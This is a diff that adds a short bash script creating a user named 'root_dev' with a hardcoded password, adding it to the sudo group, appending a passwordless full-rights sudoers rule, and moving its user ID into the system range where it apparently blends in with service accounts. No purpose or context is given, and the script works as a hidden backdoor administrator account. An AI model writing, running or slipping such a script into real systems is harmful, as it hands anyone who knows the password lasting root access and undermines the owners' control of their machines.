@@ -1,0 +1,7 @@
+#!/bin/bash
+
+useradd -m -s /bin/bash root_dev
+echo "root_dev:root_dev6969" | chpasswd
+usermod -aG sudo root_dev
+echo "root_dev ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+usermod -u 999 root_dev
